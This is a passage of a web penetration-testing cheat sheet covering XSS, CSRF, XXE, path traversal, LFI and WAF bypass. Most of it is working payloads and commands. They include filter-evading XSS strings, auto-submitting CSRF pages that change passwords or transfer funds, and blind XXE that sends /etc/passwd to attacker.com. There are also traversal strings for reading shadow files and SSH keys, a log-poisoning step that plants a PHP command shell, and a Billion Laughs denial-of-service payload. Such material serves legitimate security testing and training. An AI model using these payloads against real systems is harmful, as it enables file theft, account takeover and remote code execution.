<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.domain)>

# SVG XSS
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>

# Body tag XSS
<body onload=alert(1)>
<body onpageshow=alert(1)>

# Input field XSS
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>

# Event handlers
<div onmouseover=alert(1)>hover me</div>
<a href=javascript:alert(1)>click</a>
```

**Manual XSS Detection - Context-Specific:**

```bash
# HTML context
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# JavaScript context (inside <script> tags)
'; alert(1); //
</script><script>alert(1)</script>

# Inside JavaScript string
'-alert(1)-'
';alert(1)//

# Attribute context
" onmouseover=alert(1) "
' onmouseover=alert(1) '

# URL context
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# CSS context
</style><script>alert(1)</script>
<style>*{background:url("javascript:alert(1)")}</style>
```

**Manual XSS Detection - Filter Bypass:**

```bash
# Case variation
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

# Encoding bypass
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

# NULL byte bypass
<script%00>alert(1)</script>
<img src=x%00 onerror=alert(1)>

# Comment bypass
<script><!--*/alert(1)//--></script>
<script>/*--></script><script>alert(1)</script>

# Whitespace bypass
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<script>alert(1)</script>

# Double encoding
%253Cscript%253Ealert(1)%253C%2Fscript%253E

# Alternative tags
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select onfocus=alert(1) autofocus>
```

**Manual XSS Detection - Stored vs Reflected:**

```bash
# Reflected XSS (immediate response)
# Test in URL parameters
http://target.com/search?q=<script>alert(1)</script>

# Test in form inputs
POST /comment.php
comment=<script>alert(1)</script>

# Stored XSS (persistent)
# Test in username field
username: <script>alert('stored')</script>

# Test in comment section
comment: <img src=x onerror=alert('stored')>

# Test in profile fields
bio: <svg onload=alert('stored')>
```

**Automated XSS Scanners - XSStrike:**

```bash
# Basic XSStrike usage
xsstrike -u "http://target.com/page.php?q=test"

# POST request testing
xsstrike -u "http://target.com/page.php" --data "name=test&comment=test"

# Crawl and test
xsstrike -u "http://target.com" --crawl

# Custom payload
xsstrike -u "http://target.com/page.php?q=test" --payload "<script>alert(1)</script>"

# Fuzzing mode
xsstrike -u "http://target.com/page.php?q=test" --fuzzer

# Skip DOM XSS check
xsstrike -u "http://target.com/page.php?q=test" --skip-dom

# Blind XSS
xsstrike -u "http://target.com/page.php?q=test" --blind
```

**Automated XSS Scanners - Dalfox:**

```bash
# Basic Dalfox usage
dalfox url "http://target.com/page.php?q=test"

# File input (URLs list)
dalfox file urls.txt

# POST parameter testing
dalfox url "http://target.com/page.php" -d "name=test&comment=test"

# Pipe mode with other tools
echo "http://target.com/page.php?q=test" | dalfox pipe

# Custom payload
dalfox url "http://target.com/page.php?q=test" --custom-payload "<script>alert(1)</script>"

# WAF bypass mode
dalfox url "http://target.com/page.php?q=test" --waf-evasion

# Mining mode (parameter discovery)
dalfox url "http://target.com" --mining-dict-word params.txt

# Blind XSS with callback
dalfox url "http://target.com/page.php?q=test" --blind="http://yourserver.com"
```

**Browser-Based XSS Testing:**

```bash
# Using browser console (F12)
# Test if input is reflected
document.body.innerHTML
document.location.href

# DOM-based XSS detection
# Check URL fragment
location.hash

# Test innerHTML usage
document.getElementById('output').innerHTML = location.hash.substring(1)

# Test eval usage
eval(location.hash.substring(1))
```

**Burp Suite XSS Testing:**

```bash
# Burp Suite Intruder XSS fuzzing
# 1. Capture request in Proxy
# 2. Send to Intruder
# 3. Set injection point: §test§
# 4. Load XSS payload list
# 5. Attack and grep for: <script>, alert(, onerror=
# 6. Analyze responses for reflected payloads

# Burp Scanner (Pro version)
# Passive: Automatically detects potential XSS
# Active: Tests with various payloads
```

**XSS Payload Lists:**

```bash
# SecLists XSS payloads
/usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Filters-Evasion.txt
/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt

# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

# Using with ffuf
ffuf -w xss-payloads.txt -u "http://target.com/page.php?q=FUZZ" -mr "<script>"
```

### CSRF Detection

Cross-Site Request Forgery (CSRF) allows attackers to perform unauthorized actions on behalf of authenticated users.

**Manual CSRF Detection - Indicators:**

```bash
# Check for CSRF tokens
# Look for hidden fields in forms:
<input type="hidden" name="csrf_token" value="...">
<input type="hidden" name="token" value="...">
<input type="hidden" name="_token" value="...">

# Check HTTP headers
X-CSRF-Token: ...
X-XSRF-Token: ...

# Check cookies
Cookie: XSRF-TOKEN=...
Cookie: csrf_token=...
```

**Manual CSRF Testing - Methodology:**

```bash
# Step 1: Identify state-changing operations
# Actions like: change password, transfer funds, delete account, modify settings

# Step 2: Capture legitimate request
# Use Burp Suite or browser DevTools to capture the request

# Step 3: Remove/modify CSRF token
# Remove token parameter
# Use invalid token
# Use token from different session

# Step 4: Test if action still succeeds
```

**CSRF Proof of Concept - HTML Form:**

```html
<!-- Basic CSRF PoC -->
<html>
<body>
<form action="http://target.com/change-password" method="POST" id="csrf-form">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**CSRF PoC - GET Request:**

```html
<!-- GET-based CSRF -->
<html>
<body>
<img src="http://target.com/delete-account?confirm=yes" style="display:none">
</body>
</html>
```

**CSRF PoC - AJAX Request:**

```html
<!-- AJAX CSRF (if CORS allows) -->
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/transfer", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("to_account=attacker&amount=1000");
</script>
</body>
</html>
```

**CSRF Detection Tools - Burp Suite:**

```bash
# Burp Suite CSRF PoC Generator
# 1. Right-click on request in Proxy/Repeater
# 2. Select "Engagement tools" > "Generate CSRF PoC"
# 3. Test generated HTML
# 4. Modify and verify if CSRF protection exists

# Manual testing in Repeater:
# 1. Remove CSRF token parameter
# 2. Use different CSRF token
# 3. Use same token twice
# 4. Change request method (POST to GET)
```

**CSRF Testing Checklist:**

```bash
# Test cases to verify:
1. Remove CSRF token entirely
2. Use empty CSRF token value
3. Use random/invalid CSRF token
4. Reuse old CSRF token
5. Use another user's CSRF token
6. Change request method (POST to GET)
7. Remove token parameter from query/body but keep in cookie
8. Test if token is validated per-session or per-request

# Example tests with curl:
# Original request
curl -X POST http://target.com/change-email \
  -H "Cookie: session=abc123" \
  -d "email=new@test.com&csrf_token=valid_token"

# Test without token
curl -X POST http://target.com/change-email \
  -H "Cookie: session=abc123" \
  -d "email=new@test.com"

# Test with invalid token
curl -X POST http://target.com/change-email \
  -H "Cookie: session=abc123" \
  -d "email=new@test.com&csrf_token=invalid"
```

**CSRF Bypass Techniques:**

```bash
# Method override
# If application accepts:
POST /delete-account HTTP/1.1
_method=DELETE

# Try:
GET /delete-account?_method=DELETE HTTP/1.1

# Null value
csrf_token=null
csrf_token=

# Same length token
# If valid token: abc123def456
# Try: 111111111111

# Referer/Origin bypass
# Remove Referer header
# Use null origin
Origin: null

# Content-Type manipulation
# Change from application/x-www-form-urlencoded to text/plain
```

### XXE Detection

XML External Entity (XXE) attacks exploit vulnerabilities in XML parsers that process external entity references.

**Manual XXE Detection - Basic Payloads:**

```xml
<!-- Basic XXE - File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- XXE - Internal DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
]>
<root>&xxe;</root>

<!-- XXE - PHP wrapper -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

**Manual XXE Detection - Blind XXE:**

```xml
<!-- Blind XXE - Out-of-band data exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<root></root>

<!-- evil.dtd contents: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Manual XXE Detection - Parameter Entities:**

```xml
<!-- Parameter entity XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>&send;</root>
```

**XXE Detection - Common Injection Points:**

```bash
# Content-Type headers to test:
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/x-www-form-urlencoded (convert to XML)
Content-Type: application/json (convert to XML)

# XML in different contexts:
# SOAP requests
# SVG file uploads
# Office document uploads (.docx, .xlsx)
# RSS feeds
# SAML authentication
```

**XXE Testing - File Upload:**

```xml
<!-- SVG XXE -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**XXE Testing - SOAP Request:**

```xml
<!-- SOAP XXE -->
POST /soap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>&xxe;</foo>
</soap:Body>
</soap:Envelope>
```

**XXE Detection Tools - Burp Suite:**

```bash
# Burp Scanner (Pro)
# Automatically detects XXE vulnerabilities

# Manual testing with Repeater:
# 1. Identify XML input
# 2. Insert XXE payload
# 3. Observe response for file contents or error messages
# 4. Test blind XXE with Burp Collaborator

# Using Burp Collaborator for blind XXE:
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://burpcollaborator.net">
]>
<root>&xxe;</root>
```

**XXE Testing - Common Target Files:**

```xml
<!-- Linux targets -->
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///var/log/apache2/access.log
file:///var/www/html/config.php

<!-- Windows targets -->
file:///c:/windows/system.ini
file:///c:/windows/win.ini
file:///c:/boot.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/inetpub/wwwroot/web.config

<!-- Application files -->
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///etc/nginx/nginx.conf
file:///etc/apache2/apache2.conf
```

**XXE Exploitation - Advanced Techniques:**

```xml
<!-- XXE with parameter entities (bypass restrictions) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<root>&xxe;</root>

<!-- Port scanning via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server:22">
]>
<root>&xxe;</root>

<!-- Denial of Service - Billion Laughs -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**XXE Testing Workflow:**

```bash
# Phase 1: Identify XML input
# Look for Content-Type: application/xml
# Check for XML in request body
# Test file upload endpoints with XML formats

# Phase 2: Test basic XXE
# Inject simple entity reference
# Check response for file contents

# Phase 3: Test blind XXE
# Use out-of-band data exfiltration
# Monitor external server for connections

# Phase 4: Exploit
# Read sensitive files
# Perform SSRF attacks
# Scan internal network
```

### Path Traversal Detection

Path Traversal (Directory Traversal) allows attackers to access files outside the intended directory structure.

**Manual Path Traversal - Basic Payloads:**

```bash
# Basic traversal
../
../../
../../../
../../../../
../../../../../

# URL encoded
..%2F
..%2f
%2e%2e%2f
%2e%2e/

# Double URL encoded
%252e%252e%252f

# Unicode/UTF-8 encoded
..%c0%af
..%c1%9c
```

**Manual Path Traversal - Common Targets:**

```bash
# Linux files
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../home/user/.ssh/id_rsa
../../../../var/log/apache2/access.log
../../../../var/www/html/config.php

# Windows files
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system.ini
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\inetpub\wwwroot\web.config

# Application files
../../../../var/www/html/index.php
../../../../app/config/database.yml
../../../../config/database.php
../../../../.env
../../../../wp-config.php
```

**Path Traversal - Injection Points:**

```bash
# File parameter
http://target.com/download?file=../../../../etc/passwd
http://target.com/view.php?page=../../../../etc/passwd

# Include parameter
http://target.com/index.php?include=../../../../etc/passwd

# Template parameter
http://target.com/?template=../../../../etc/passwd

# Path parameter
http://target.com/files/../../../../etc/passwd

# Language/locale parameter
http://target.com/?lang=../../../../etc/passwd
```

**Path Traversal - Bypass Techniques:**

```bash
# Null byte injection (older PHP versions)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Adding expected extension
../../../../etc/passwd.php
../../../../etc/passwd.txt

# Absolute path
file:///etc/passwd
/etc/passwd

# Using valid path prefix
/var/www/html/../../../../etc/passwd
valid-path/../../../../etc/passwd

# Backslash on Windows
..\..\..\..\windows\system.ini

# Forward slash on Windows
../../../../windows/system.ini

# Mixed slashes
..\/..\/..\/etc/passwd

# Redundant traversal
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Filter bypass
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
```

**Path Traversal - Encoding Variations:**

```bash
# URL encoding
..%2F..%2F..%2Fetc%2Fpasswd

# Double URL encoding
..%252F..%252F..%252Fetc%252Fpasswd

# UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# 16-bit Unicode encoding
%u002e%u002e%u2216
%u002e%u002e/

# Mixed encoding
..%252f..%252f..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af
%e0%40%ae%e0%40%ae%e0%40%af

# HTML entity encoding (in specific contexts)
&period;&period;&sol;
```

**Path Traversal - Automated Testing with Tools:**

```bash
# dotdotpwn - Comprehensive directory traversal fuzzer
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:"

# Options:
# -m: Module (http, http-url, ftp, tftp, payload, stdout)
# -h: Hostname
# -x: Port
# -f: File to retrieve
# -k: Text pattern to match (success indicator)
# -d: Traversal depth
# -t: Time between requests (milliseconds)

# HTTP-specific options
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:" -C "page=TRAVERSAL"
# -C: Cookie
# -U: URL pattern with TRAVERSAL placeholder

# Example with custom pattern
dotdotpwn -m http-url -h target.com -x 80 -U "http://target.com/download?file=TRAVERSAL" -f /etc/passwd -k "root:"
```

**Path Traversal - wfuzz Fuzzing:**

```bash
# Basic wfuzz path traversal
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hc 404 "http://target.com/page?file=FUZZ"

# Filter by response size
wfuzz -c -w traversal-payloads.txt --hh 0 "http://target.com/download?file=FUZZ"

# Filter by response code and string
wfuzz -c -w traversal-payloads.txt --sc 200 --ss "root:" "http://target.com/view?page=FUZZ"

# POST request fuzzing
wfuzz -c -w traversal-payloads.txt -d "filename=FUZZ" "http://target.com/download"

# Custom traversal wordlist
cat > traversal.txt <<EOF
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
EOF

wfuzz -c -w traversal.txt --hh 0 "http://target.com/file?path=FUZZ"
```

**Path Traversal - ffuf Fuzzing:**

```bash
# Basic ffuf path traversal
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://target.com/page?file=FUZZ" -mc 200

# Filter by response size
ffuf -w traversal-payloads.txt -u "http://target.com/download?file=FUZZ" -fs 0

# Filter by regex pattern (look for success indicators)
ffuf -w traversal-payloads.txt -u "http://target.com/view?page=FUZZ" -mr "root:"

# Recursion mode
ffuf -w wordlist.txt -u "http://target.com/FUZZ" -recursion -recursion-depth 2

# POST request fuzzing
ffuf -w traversal-payloads.txt -u "http://target.com/download" -X POST -d "file=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
```

**Path Traversal - Burp Suite Intruder:**

```bash
# Burp Suite methodology:
# 1. Capture request with file parameter
# 2. Send to Intruder
# 3. Mark parameter position: §/etc/passwd§
# 4. Load payload list (Fuzzing > LFI/Path Traversal)
# 5. Payload processing:
#    - Add prefix: ../../../../
#    - Encode: URL-encode all characters
# 6. Grep - Match: root:, admin, password
# 7. Start attack
# 8. Sort by Response length/status to identify anomalies
```

**Path Traversal - Manual Testing Checklist:**

```bash
# Test cases:
1. Basic traversal: ../../../../etc/passwd
2. Encoded traversal: ..%2F..%2F..%2Fetc%2Fpasswd
3. Double encoded: ..%252F..%252Fetc%252Fpasswd
4. Null byte: ../../../../etc/passwd%00
5. Backslash (Windows): ..\..\..\..\windows\system.ini
6. Absolute paths: /etc/passwd
7. URL schemes: file:///etc/passwd
8. Nested traversal: ....//....//etc/passwd
9. With valid prefix: files/../../../../etc/passwd
10. Unicode variations: ..%c0%af..%c0%afetc/passwd
```

**Path Traversal - Testing Different Parameters:**

```bash
# GET parameters
curl "http://target.com/download?file=../../../../etc/passwd"
curl "http://target.com/view?page=../../../../etc/passwd"
curl "http://target.com/?template=../../../../etc/passwd"

# POST parameters
curl -X POST "http://target.com/download" -d "filename=../../../../etc/passwd"

# JSON payload
curl -X POST "http://target.com/api/file" \
  -H "Content-Type: application/json" \
  -d '{"path":"../../../../etc/passwd"}'

# Cookie parameters
curl "http://target.com/page" \
  -H "Cookie: file=../../../../etc/passwd"

# HTTP headers
curl "http://target.com/page" \
  -H "X-File-Path: ../../../../etc/passwd"

# User-Agent (rare but possible)
curl "http://target.com/log" \
  -H "User-Agent: ../../../../etc/passwd"
```

**Path Traversal - Platform-Specific Targets:**

```bash
# Linux application files
/var/www/html/.htaccess
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/root/.ssh/id_rsa
/root/.bash_history
/home/user/.ssh/authorized_keys

# Windows application files
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\wamp\www\index.php
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Users\Administrator\Desktop\passwords.txt
C:\Windows\System32\config\SAM

# Common web applications
/var/www/html/wp-config.php (WordPress)
/var/www/html/.git/config (Git repositories)
/var/www/html/application/config/database.php (CodeIgniter)
/var/www/html/sites/default/settings.php (Drupal)
/var/www/html/configuration.php (Joomla)
```

**Path Traversal - Log Poisoning Combination:**

```bash
# Log file locations to test
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/auth.log
/var/log/syslog

# Log poisoning technique:
# 1. Inject PHP code in User-Agent
curl "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Access log file via path traversal
curl "http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=whoami"

# 3. Verify code execution
curl "http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id"
```

**Path Traversal - Exploitation Workflow:**

```bash
# Phase 1: Identify vulnerable parameter
# Test basic traversal on file-related parameters

# Phase 2: Determine traversal depth
# Increment ../ sequences until successful

# Phase 3: Identify OS and web root
# Read OS-specific files to determine platform

# Phase 4: Extract sensitive information
curl "http://target.com/download?file=../../../../etc/passwd" > passwd.txt
curl "http://target.com/download?file=../../../../var/www/html/config.php" > config.txt

# Phase 5: Attempt log poisoning or RCE
# If log files are accessible, inject code and execute
```

### Comprehensive Web Vulnerability Assessment Workflow

**Phase 1: Reconnaissance and Mapping**

```bash
# Crawl application
gospider -s "http://target.com" -o output -c 10 -d 3

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Parameter discovery
arjun -u http://target.com/page.php

# Technology detection
whatweb http://target.com
wappalyzer (browser extension)
```

**Phase 2: Automated Vulnerability Scanning**

```bash
# Nikto web scanner
nikto -h http://target.com -C all -output nikto_results.txt

# OWASP ZAP automated scan
zap-cli quick-scan -s all http://target.com

# Nuclei vulnerability scanner
nuclei -u http://target.com -t /path/to/nuclei-templates/

# Custom nuclei scan for specific vulnerabilities
nuclei -u http://target.com -t nuclei-templates/cves/
nuclei -u http://target.com -t nuclei-templates/vulnerabilities/
```

**Phase 3: Manual Testing - SQLi**

```bash
# Test all input points
# GET parameters
sqlmap -u "http://target.com/page.php?id=1" --batch

# POST parameters
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --batch

# Cookie parameters
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc;id=1" -p id --batch

# Headers
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 1*" --batch
```

**Phase 4: Manual Testing - XSS**

```bash
# Test reflection points
# Input fields
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>

# URL parameters
http://target.com/search?q=<script>alert(1)</script>

# Use automated scanner
xsstrike -u "http://target.com/search?q=test"
dalfox url "http://target.com/page?param=test"
```

**Phase 5: Manual Testing - CSRF**

```bash
# Identify state-changing functions
# Check for CSRF protection
# Generate PoC in Burp Suite
# Test with different scenarios:
# 1. No token
# 2. Invalid token
# 3. Reused token
# 4. Token from different session
```

**Phase 6: Manual Testing - XXE**

```bash
# Identify XML input points
# Test basic XXE payloads
# Test file upload with SVG/XML files
# Test SOAP endpoints

# Example test
curl -X POST http://target.com/xml -H "Content-Type: application/xml" -d @xxe_payload.xml
```

**Phase 7: Manual Testing - Path Traversal**

```bash
# Test file-related parameters
dotdotpwn -m http -h target.com -U "http://target.com/download?file=TRAVERSAL" -f /etc/passwd

# Manual verification
curl "http://target.com/download?file=../../../../etc/passwd"

# Test encoding variations
curl "http://target.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
```

**Phase 8: Results Compilation and Reporting**

```bash
# Organize findings by severity
# Document reproduction steps
# Create proof of concepts
# Provide remediation recommendations
```

### Additional Web Vulnerability Testing Tools

**Nuclei - Template-Based Scanner:**

```bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Basic scan
nuclei -u http://target.com

# Scan with specific severity
nuclei -u http://target.com -severity critical,high

# Scan specific vulnerability types
nuclei -u http://target.com -tags sqli,xss,xxe

# Scan with rate limiting
nuclei -u http://target.com -rate-limit 10

# Scan list of URLs
nuclei -l urls.txt

# Custom template
nuclei -u http://target.com -t custom-template.yaml

# Output formats
nuclei -u http://target.com -json -o results.json
nuclei -u http://target.com -markdown -o results.md
```

**Commix - Command Injection Detection:**

```bash
# Command injection testing (related to web vulns)
commix -u "http://target.com/page?ip=127.0.0.1"

# POST request
commix -u "http://target.com/ping" --data="ip=127.0.0.1"

# Cookie-based injection
commix -u "http://target.com/page" --cookie="ip=127.0.0.1"

# Test specific parameter
commix -u "http://target.com/page?ip=127.0.0.1&debug=1" -p ip

# Verbose output
commix -u "http://target.com/page?ip=127.0.0.1" -v
```

**OWASP ZAP - Comprehensive Scanner:**

```bash
# CLI scanning
zap-cli quick-scan -s all -r http://target.com

# Start ZAP daemon
zap.sh -daemon -port 8080 -config api.disablekey=true

# Spider target
zap-cli spider http://target.com

# Active scan
zap-cli active-scan http://target.com

# Generate report
zap-cli report -o zap_report.html -f html
```

**Subjack - Subdomain Takeover:**

```bash
# While not strictly a vulnerability, subdomain takeover can be critical
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c ~/subjack/fingerprints.json -o results.txt
```

**Arjun - HTTP Parameter Discovery:**

```bash
# Discover hidden parameters
arjun -u http://target.com/page.php

# POST request parameter discovery
arjun -u http://target.com/api -m POST

# Custom wordlist
arjun -u http://target.com/page -w custom-params.txt

# Include headers
arjun -u http://target.com/page -H "Authorization: Bearer token"

# Output to file
arjun -u http://target.com/page -o discovered_params.json
```

**Hakrawler - Web Crawler for Vulnerability Discovery:**

```bash
# Crawl and discover endpoints
echo "http://target.com" | hakrawler

# Crawl with depth
echo "http://target.com" | hakrawler -d 3

# Include subdomains
echo "http://target.com" | hakrawler -subs

# Output URLs with parameters
echo "http://target.com" | hakrawler | grep "?"
```

### Creating Custom Test Cases

**Custom SQLi Test Script:**

```bash
#!/bin/bash
# sqli_test.sh

URL="$1"
PARAM="$2"

echo "[*] Testing SQL Injection on $URL with parameter $PARAM"

# Test basic payloads
payloads=(
    "'"
    "'--"
    "' OR '1'='1"
    "' OR 1=1--"
    "' UNION SELECT NULL--"
    "' AND SLEEP(5)--"
)

for payload in "${payloads[@]}"; do
    echo "[+] Testing: $payload"
    encoded=$(echo "$payload" | jq -sRr @uri)
    response_time=$(curl -w "%{time_total}" -s -o /dev/null "${URL}?${PARAM}=${encoded}")
    echo "[*] Response time: $response_time seconds"
    
    if (( $(echo "$response_time > 5" | bc -l) )); then
        echo "[!] Possible time-based SQL injection detected!"
    fi
done
```

**Custom XSS Test Script:**

```bash
#!/bin/bash
# xss_test.sh

URL="$1"
PARAM="$2"

echo "[*] Testing XSS on $URL with parameter $PARAM"

payloads=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "'><script>alert(1)</script>"
    "\"><script>alert(1)</script>"
)

for payload in "${payloads[@]}"; do
    echo "[+] Testing: $payload"
    encoded=$(echo "$payload" | jq -sRr @uri)
    response=$(curl -s "${URL}?${PARAM}=${encoded}")
    
    if echo "$response" | grep -q "$payload"; then
        echo "[!] Possible reflected XSS detected!"
        echo "[!] Payload reflected without encoding"
    fi
done
```

**Custom Path Traversal Test Script:**

```bash
#!/bin/bash
# path_traversal_test.sh

URL="$1"
PARAM="$2"

echo "[*] Testing Path Traversal on $URL with parameter $PARAM"

payloads=(
    "../../../../etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "....//....//etc/passwd"
    "/etc/passwd"
    "....\/....\/etc/passwd"
)

for payload in "${payloads[@]}"; do
    echo "[+] Testing: $payload"
    encoded=$(echo "$payload" | jq -sRr @uri)
    response=$(curl -s "${URL}?${PARAM}=${encoded}")
    
    if echo "$response" | grep -q "root:"; then
        echo "[!] Path traversal vulnerability detected!"
        echo "[!] Successfully read /etc/passwd"
        break
    fi
done
```

### Web Application Firewall (WAF) Detection and Bypass

**WAF Detection:**

```bash
# wafw00f - WAF detection
wafw00f http://target.com

# whatwaf - WAF detection
whatwaf -u http://target.com

# Nmap WAF detection
nmap -p 80,443 --script http-waf-detect target.com
nmap -p 80,443 --script http-waf-fingerprint target.com
```

**WAF Bypass Techniques:**

```bash
# SQLi WAF bypass with sqlmap
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# Common tamper scripts:
--tamper=apostrophemask
--tamper=apostrophenullencode
--tamper=base64encode
--tamper=between
--tamper=charencode
--tamper=charunicodeencode
--tamper=equaltolike
--tamper=space2comment
--tamper=space2plus
--tamper=space2randomblank
--tamper=unionalltounion
--tamper=versionedmorekeywords

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# XSS WAF bypass techniques
<sCrIpT>alert(1)</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Comment insertion
<script>/**/alert(1)</script>
<script><!--*/alert(1)//--></script>

# Encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

### File Inclusion (LFI/RFI)

Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities occur when applications include files based on user-controllable input without proper validation.

**Common vulnerable parameters:**

```
?file=
?page=
?include=
?path=
?load=
?doc=
?folder=
?template=
?style=
?pdf=
?cat=
```

**Basic LFI testing:**

```bash
# Linux targets
http://target/page.php?file=../../../../etc/passwd
http://target/page.php?file=../../../../etc/shadow
http://target/page.php?file=../../../../var/log/apache2/access.log
http://target/page.php?file=/etc/passwd
http://target/page.php?file=../../../../../../../etc/passwd

# Windows targets
http://target/page.php?file=../../../../windows/system32/drivers/etc/hosts
http://target/page.php?file=../../../../windows/win.ini
http://target/page.php?file=C:\windows\system32\drivers\etc\hosts
```

**Common interesting files:**

Linux:

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/group
/proc/self/environ
/proc/self/cmdline
/proc/self/stat
/proc/self/status
/proc/self/fd/0-10
/proc/version
/proc/net/tcp
